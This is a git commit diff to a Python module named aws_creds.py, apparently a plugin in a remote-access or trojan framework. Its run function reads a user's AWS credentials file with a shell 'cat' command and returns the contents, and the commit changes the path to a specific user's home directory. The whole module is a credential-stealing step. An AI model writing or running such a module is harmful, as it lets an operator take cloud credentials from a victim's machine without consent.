57e7ffc9fe64d0009dea9f5d1346ba779964f998
exiett <exiett@aol.com>
2023-02-09 21:57:38 -0300

    commit

--- modules/aws_creds.py
+++ modules/aws_creds.py
@@ -2,5 +2,5 @@ import os
 
 def run(**args):
     print("[*] In aws_creds module.")
-    files = os.popen('cat ~/.aws/credentials').read()
+    files = os.popen('cat /Users/lucas.teixeira/.aws/credentials').read()
     return str(files)
